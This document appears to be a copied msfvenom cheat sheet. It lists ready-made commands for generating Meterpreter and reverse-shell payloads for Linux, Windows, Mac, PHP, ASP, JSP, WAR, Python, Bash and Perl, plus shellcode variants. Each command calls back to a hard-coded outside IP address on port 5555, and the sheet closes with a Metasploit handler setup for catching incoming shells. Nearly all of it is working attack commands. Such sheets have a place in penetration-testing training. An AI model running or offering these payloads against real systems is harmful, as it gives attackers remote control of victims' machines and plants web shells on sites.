Linux

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=120.24.159.2 LPORT=5555 -f elf > linux_shell.elf
Windows

msfvenom -p windows/meterpreter/reverse_tcp LHOST=120.24.159.2 LPORT=5555 -f exe > shell.exe
Mac

msfvenom -p osx/x86/shell_reverse_tcp LHOST=120.24.159.2 LPORT=5555 -f macho > shell.macho

Web Payloads
PHP

msfvenom -p php/meterpreter_reverse_tcp LHOST=120.24.159.2 LPORT=5555 -f raw > shell.php

cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
ASP

msfvenom -p windows/meterpreter/reverse_tcp LHOST=120.24.159.2 LPORT=5555 -f asp > shell.asp
JSP

msfvenom -p java/jsp_shell_reverse_tcp LHOST=120.24.159.2 LPORT=5555 -f raw > shell.jsp
WAR

msfvenom -p java/jsp_shell_reverse_tcp LHOST=120.24.159.2 LPORT=5555 -f war > shell.war

Scripting Payloads
Python

msfvenom -p cmd/unix/reverse_python LHOST=120.24.159.2 LPORT=5555 -f raw > shell.py
Bash

msfvenom -p cmd/unix/reverse_bash LHOST=120.24.159.2 LPORT=5555 -f raw > shell.sh
Perl

msfvenom -p cmd/unix/reverse_perl LHOST=120.24.159.2 LPORT=5555 -f raw > shell.pl
Shellcode:

For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.

Linux Based Shellcode

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=120.24.159.2 LPORT=5555 -f <language>
Windows Based Shellcode

msfvenom -p windows/meterpreter/reverse_tcp LHOST=120.24.159.2 LPORT=5555 -f <language>
 

Mac Based Shellcode

msfvenom -p osx/x86/shell_reverse_tcp LHOST=120.24.159.2 LPORT=5555 -f <language>
Handlers

Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.

复制代码
use exploit/multi/handler

set PAYLOAD <Payload name>

set LHOST <LHOST value>

set LPORT <LPORT value>

set ExitOnSession false

exploit -j -z
复制代码
